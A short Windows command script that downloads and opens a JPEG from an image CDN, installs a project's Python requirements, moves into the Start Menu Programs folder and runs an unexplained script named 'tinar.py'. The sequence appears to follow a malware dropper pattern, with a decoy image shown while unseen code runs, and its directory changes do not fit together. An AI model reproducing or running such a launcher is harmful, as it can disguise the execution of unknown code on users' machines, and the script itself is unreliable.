cd %temp%
curl -o imp.jpg https://media.tacdn.com/media/attractions-splice-spp-674x446/0b/39/a9/9f.jpg
imp.jpg
cd system/Testing-main
pip install -r requirements.txt
cd %AppData%\Microsoft\Windows\Start Menu\Programs
python tinar.py
